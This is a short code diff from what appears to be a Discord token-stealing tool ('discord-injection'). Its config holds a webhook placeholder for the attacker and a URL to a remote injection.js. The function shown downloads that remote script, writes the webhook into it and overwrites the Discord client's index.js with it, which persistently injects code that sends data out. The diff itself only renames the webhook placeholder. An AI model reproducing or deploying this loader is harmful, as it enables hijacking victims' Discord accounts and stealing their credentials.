@@ -12,7 +12,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK%",
+    webhook: "YOUR_WEBHOOK_HERE",
     injection_url: "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/injection.js",
     filters: {
         urls: [
@@ -526,7 +526,7 @@ async function initiation() {
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
           const file = fs.createWriteStream(indexJs);
-          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
+          res.replace('YOUR_WEBHOOK_HERE', '${CONFIG.webhook}')
           res.pipe(file);
           file.on('finish', () => {
               file.close();
